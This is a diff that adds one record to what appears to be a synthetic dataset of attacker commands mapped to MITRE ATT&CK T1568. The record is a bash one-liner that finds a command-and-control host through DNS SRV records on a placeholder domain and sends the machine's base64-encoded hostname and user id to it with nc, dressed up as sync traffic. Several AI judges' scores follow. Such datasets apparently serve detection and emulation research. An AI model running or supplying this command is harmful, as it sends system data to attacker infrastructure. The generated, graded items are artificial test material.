@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "bash -c \"domain=cdn-service.example.com; srv=$(dig +short _sync._tcp.\\\"$domain\\\" SRV | sort -n | head -n1); target=$(printf '%s' \\\"$srv\\\" | awk '{print $4}' | sed 's/\\.$//'); port=$(printf '%s' \\\"$srv\\\" | awk '{print $3}'); ip=$(dig +short \\\"$target\\\" | shuf -n1); ua=\\\"Mozilla/5.0\\\"; data=$(printf 'h=%s&u=%s' \\\"$(hostname -s)\\\" \\\"$(id -u)\\\" | base64 -w0); body=\\\"$data\\\"; printf 'POST /sync HTTP/1.1\\r\\nHost: %s\\r\\nUser-Agent: %s\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: %d\\r\\nConnection: close\\r\\n\\r\\n%s' \\\"$domain\\\" \\\"$ua\\\" ${#body} \\\"$body\\\" | nc -w 5 \\\"$ip\\\" \\\"$port\\\"\"",
+  "explanation": "Discovers service endpoints dynamically via DNS SRV records and resolves the SRV target to an IP, then posts base64 data to a generic sync path to blend in.",
+  "rationale_steps": [
+    "Query SRV to dynamically locate C2 service host and port.",
+    "Resolve SRV target's A record at runtime and randomize IP.",
+    "Mimic a sync API over HTTP with common headers.",
+    "Transmit via nc over the SRV-specified TCP port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-213026ff-76243d9a",
+  "source_prompt_hash": "213026ff",
+  "timestamp_utc": "2025-09-30T03:23:47.812011Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quoting (properly escaped for bash -c), valid substitutions, and correct flags for dig, sort, head, awk, sed, shuf, base64, printf, and nc.",
+        "semantic_score": 5,
+        "semantic_justification": "It dynamically discovers service endpoints via DNS SRV, resolves the target to an IP, selects one, and performs an HTTP POST to that endpoint, aligning well with T1568 Dynamic Resolution behavior.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T06:14:34.301331Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is largely well-formed with proper quoting, semicolons, and pipe chains, though the arithmetic expansion `${#body}` for Content-Length and the nested quoting around `$domain` in the dig SRV query may cause edge-case failures in some bash environments.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1568 dynamic resolution by using DNS SRV records to discover service endpoints at runtime, randomly selecting an IP via `shuf` to emulate fast-flux behavior, and exfiltrating base64-encoded host/user data over a raw netcat HTTP POST to blend in as legitimate sync traffic.",
+        "combined_score": 4.5,
+        "confidence": 0.88,
+        "timestamp": "2026-02-19T00:21:56.562073Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is a perfectly well-formed bash one-liner with balanced quotes, valid command separators, and correct tool flags.",
+        "semantic_score": 2,
+        "semantic_justification": "The logic for dynamic resolution via SRV records is excellent, but the command fails operationally because the double-quoted bash -c wrapper causes the parent shell to prematurely expand all internal variables and awk positional parameters ($3, $4) before execution.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2026-02-19T00:22:26.007362Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
